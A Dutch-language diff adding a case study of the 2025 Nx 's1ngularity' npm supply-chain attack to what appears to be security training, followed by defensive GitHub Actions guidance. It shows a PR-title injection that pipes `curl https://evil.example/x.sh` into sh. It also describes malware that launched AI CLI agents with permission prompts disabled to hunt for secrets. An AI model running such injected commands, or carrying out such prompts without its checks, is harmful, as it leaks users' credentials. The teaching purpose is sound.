@@ -1,0 +1,52 @@
+### Casestudie 3 — Nx "s1ngularity" (augustus 2025): malware die je AI-assistent inschakelt
+
+Nx is een populair build-systeem voor monorepo's met ongeveer 6 miljoen downloads per week. Op 26 augustus 2025 verschenen kwaadaardige versies, gepubliceerd met het echte npm-token van het project.
+
+- **Toegang.** Een GitHub Actions-workflow die PR-titels controleerde, draaide op de trigger `pull_request_target` en plakte de titel van een pull request rechtstreeks in een bash-commando. Een PR met een titel die shellcode bevatte, gaf de aanvaller een token met schrijfrechten. Daarmee startte hij de publicatie-workflow vanaf zijn eigen branch, die het `NPM_TOKEN` naar hem doorstuurde. Volgens Snyk was de kwetsbare workflow vermoedelijk door een AI-assistent geschreven, en de kwetsbaarheid werd bij review niet opgemerkt.
+- **Verspreiding.** Tussen 22:32 UTC op 26 augustus en 00:37 UTC op 27 augustus verschenen acht kwaadaardige versies van `nx` en enkele `@nx/*`-packages. Ook de Nx-extensie voor VS Code kon de installatie triggeren.
+- **Payload.** Een `postinstall`-script, `telemetry.js`, zocht op macOS en Linux naar lokaal geïnstalleerde AI-tools voor de opdrachtregel en startte ze met vlaggen die alle veiligheidsvragen uitschakelen: `claude --dangerously-skip-permissions`, `gemini --yolo` en `q --trust-all-tools`. Met een prompt ("You are a file-search agent…") liet het de AI zoeken naar wallets en secrets. Daarnaast verzamelde het GitHub- en npm-tokens, SSH-sleutels en `.env`-bestanden, en zette het alles drievoudig base64-gecodeerd in een **publieke** repository `s1ngularity-repository` op het GitHub-account van het slachtoffer zelf. Als pesterij voegde het `sudo shutdown -h 0` toe aan `~/.bashrc` en `~/.zshrc`.
+- **Detectie en respons.** Een gebruiker meldde het binnen enkele uren; npm verwijderde de versies na ongeveer vier à vijf uur. GitGuardian telde 2.349 gelekte secrets. De AI-truc lukte op 95 van de 366 systemen waar het geprobeerd werd. In een tweede golf gebruikten de aanvallers gestolen GitHub-tokens om duizenden *private* repositories publiek te maken. Nx stapte daarna over op trusted publishing en vereist nu goedkeuring voor workflows van externe bijdragers.
+
+**Les.** Twee nieuwe lessen. Ten eerste is CI een volwaardig aanvalsoppervlak: `pull_request_target` met onvertrouwde invoer is een klassieke valkuil. Ten tweede zijn AI-agents op je laptop een nieuw soort gereedschap voor aanvallers. Een agent die alles mag zonder te vragen, doet ook wat malware vraagt.
+
+jobs:
+  check-title:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "Titel: ${{ github.event.pull_request.title }}"
+```
+
+Een PR met als titel `"; curl https://evil.example/x.sh | sh; echo "` voert het script van de aanvaller uit, met toegang tot je secrets. Zo begon s1ngularity.
+
+```yaml
+# BETER: gewone pull_request-trigger, minimale rechten,
+# en onvertrouwde invoer via een omgevingsvariabele.
+on:
+  pull_request:
+    types: [opened, edited, synchronize, reopened]   # ook bij een gewijzigde titel
+permissions:
+  contents: read
+jobs:
+  check-title:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: echo "Titel: $TITLE"
+```
+
+De regels die je moet kennen:
+
+1. **Vermijd `pull_request_target`**, en voer onder die trigger nooit code uit een pull request uit. Nx, PostHog, Trivy en TanStack vielen hierdoor.
+2. **Geef onvertrouwde invoer door via `env:`**, nooit via `${{ }}` in een `run:`-stap.
+3. **Least privilege**: zet `permissions` standaard op `contents: read` en geef `id-token: write` alleen aan de publicatiejob.
+4. **Pin Actions op een volledige commit-SHA**, niet op een tag. Bij tj-actions en Trivy werden bestaande tags gewoon verplaatst. GitHub kan SHA-pinning afdwingen via een beleid, en sinds 14 oktober 2026 bestaan workflow-lockfiles in public preview.
+5. **Behandel de cache als invoer**: laat onvertrouwde triggers geen cache schrijven die je release-workflow leest.
+6. **Bescherm publicatie met een environment** met verplichte reviewers, en geef elke environment alleen de secrets die ze nodig heeft.
+7. **Roteer secrets in één keer** na een incident. Bij Trivy hield de aanvaller toegang omdat de rotatie gespreid verliep.
+8. **Kijk mee**: `zizmor` analyseert workflows statisch op deze fouten, StepSecurity Harden-Runner bewaakt het netwerkverkeer van runners (zo werd tj-actions ontdekt). Laat je ook waarschuwen bij elke publicatie van je eigen packages: axios en TanStack hadden geen alarm bij een onverwachte publicatie.
+
+**Kernpunt.** Als maintainer bescherm je niet alleen jezelf, maar iedereen die van je afhangt. Phishing-resistente 2FA, trusted publishing zonder tokens, staged publishing en een beveiligde pipeline maken van jouw package een saai doelwit.
+
+## Deel 7 — Geavanceerd en vooruitblik (0:40–0:43)
+
